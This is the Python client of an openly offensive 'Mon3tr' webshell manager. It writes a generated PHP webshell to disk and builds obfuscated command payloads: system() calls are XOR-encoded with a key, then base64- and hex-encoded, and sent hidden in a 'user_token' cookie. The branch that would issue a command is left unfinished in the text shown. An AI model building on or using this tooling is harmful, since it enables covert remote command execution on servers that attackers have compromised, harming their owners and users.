"""  
@Time: 2024/3/6 9:58 
@Auth: Y5neKO
@File: console.py 
@IDE: PyCharm 
"""
import argparse
import os

import requests
import base64

from core.general import *


def request(url, payload):
    headers = {"Content-Type": "application/json;charset=gbk"}
    cookies = {"user_token": payload}
    response = requests.get(url=url, headers=headers, cookies=cookies)
    response.encoding = "gbk"
    return response.text


def xor_decode(string, key):
    str_length = len(string)
    key_length = len(key)
    tmp = 0
    result = ""

    for i in range(0, str_length):
        result += chr(ord(string[i]) ^ ord(key[tmp]))

        if tmp + 1 < key_length:
            tmp += 1
        else:
            tmp = 0

    return result


def payload_generate(cmd, key):
    payload = xor_decode("system('" + cmd + "');", key)
    payload = base64.b64encode(payload.encode("utf-8"))
    payload = payload.hex()
    print(payload)
    return payload


def main():
    parse = argparse.ArgumentParser(description="Mon3tr Webshell Management Client",
                                    formatter_class=argparse.RawTextHelpFormatter)

    parse.add_argument("-g", "--generate_webshell", action="store", type=str,
                       help="生成webshell的文件名")
    parse.add_argument("-w", "--webshell", action="store", type=str, help="webshell路径")
    parse.add_argument("-c", "--cmd", action="store", type=str, help="执行命令")
    parse.add_argument("-x", "--xor", action="store", type=str, help="xor加密key")

    # 接收命令行参数解析后的参数
    args = parse.parse_args()

    print("------------------------------开始任务------------------------------")

    if args.generate_webshell is not None:
        webshell_dir = args.generate_webshell
        webshell_data = gen_php_webshell()
        with open(webshell_dir, 'w') as f:
            f.write(webshell_data[0])
        print("生成成功, 路径为: " + os.path.abspath(webshell_dir))
        print(webshell_data[1])

    if args.webshell is not None:
        if args.cmd is not None:
            webshell_path = args.webshell

    print("------------------------------任务结束------------------------------")
